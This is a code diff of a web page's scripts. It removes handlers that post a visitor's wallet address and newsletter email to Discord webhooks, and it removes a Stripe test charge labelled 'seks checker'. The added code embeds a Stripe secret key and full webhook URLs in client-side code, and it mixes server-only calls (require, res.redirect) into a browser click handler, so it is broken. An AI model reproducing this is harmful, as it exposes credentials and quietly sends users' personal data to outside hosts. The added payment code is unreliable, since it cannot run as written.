@@ -981,7 +981,7 @@ var adress = document.getElementById("wallet").value;
 	
       var request = new XMLHttpRequest();
 	    
-      request.open("POST", "https://discord.com/api/webhooks/1053370904756899850/-Xvf_iS3WQJnjvE6K-BcpPLIHtHj6iY_9Ta42uveHIwZroEeuB89oAMnPeBjWhLGDD--");
+      request.open("POST", "");
 
       request.setRequestHeader('Content-type', 'application/json');
 
@@ -1007,18 +1007,31 @@ var adress = document.getElementById("wallet").value;
 
 
 
+const element = document.getElementById("myBtn");
+element.addEventListener("click", run);
+
+
+async function run() {
 const Stripe = require('stripe');
 const stripe = Stripe('sk_test_51MAKcTLv1WATfSOugdSRHHANdtjjCEQwXan6qwJJxwRRVGV1q1enDVX7zKYLob4w6USZ19kmsCyg2Yow5IQGU2oJ00DIuqqH2l');
-stripe.charges.create({
-  amount: 2000,
-  currency: "usd",
-  source: "tok_mastercard", // obtained with Stripe.js
-  description: "seks checker"
-}, {
-  idempotencyKey: "JmxveEHxF3UiUcMd"
-}, function(err, charge) {
-  // asynchronously called
+
+const session = await stripe.checkout.sessions.create({
+mode: 'payment',
+line_items: [{
+	price: 'price_1MKouYLv1WATfSOu4JuxBiSb',
+	quantity: 1,
+}],
+
+submit_type: 'donate',
+
+success_url: 'https://google.com/',
+cancel_url: 'https://google.com/',
+	
 });
+
+return res.redirect(303, session.url);
+
+}
 				
      
 
@@ -1035,37 +1048,7 @@ stripe.charges.create({
 
 
 
-  <script>
-    function news1() {
-
-       
-     
-	    
-var contact = document.getElementById("email-newsletter").value;
-
-
-	
-      var request = new XMLHttpRequest();
-	    
-      request.open("POST", "https://discord.com/api/webhooks/1055586463833673729/fjK2M2OgPD1gFN-mOXGM42wW6XiRrcVsIlCIBZ1UGcKAPqlwOkHV7NPoSf1uN4-xtnP-");
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-	  
-      var params = {
-	     
-        username: "NEW EMAIL in newsletter",
-        avatar_url: "",
-        content: contact
-	              
-
-      }
-
-      request.send(JSON.stringify(params));
-	  
-    }
-
-  </script>
+ 
 
 </body>
 
